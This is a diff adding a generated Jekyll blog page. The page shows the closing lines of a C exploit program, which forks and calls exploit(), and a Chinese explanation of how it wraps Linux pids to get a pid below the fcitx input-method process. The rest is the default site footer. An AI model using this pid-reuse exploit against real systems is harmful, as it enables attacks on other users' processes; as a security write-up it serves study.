+                <span class="n">printf</span><span class="p">(</span><span class="s">"error: cannot fork</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="n">exploit</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div>
+<p>参数是进程名带有fcitx的所有进程的最小pid，如果当前分配到的比较小的话，会把linux的pid滚一次，使得分配到的pid比fcitx的小，这样的话要运行两次（不知道为什么，fork太快在/proc就看不到进程了。。不知道是Linux的bug还是feature。。。）</p>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
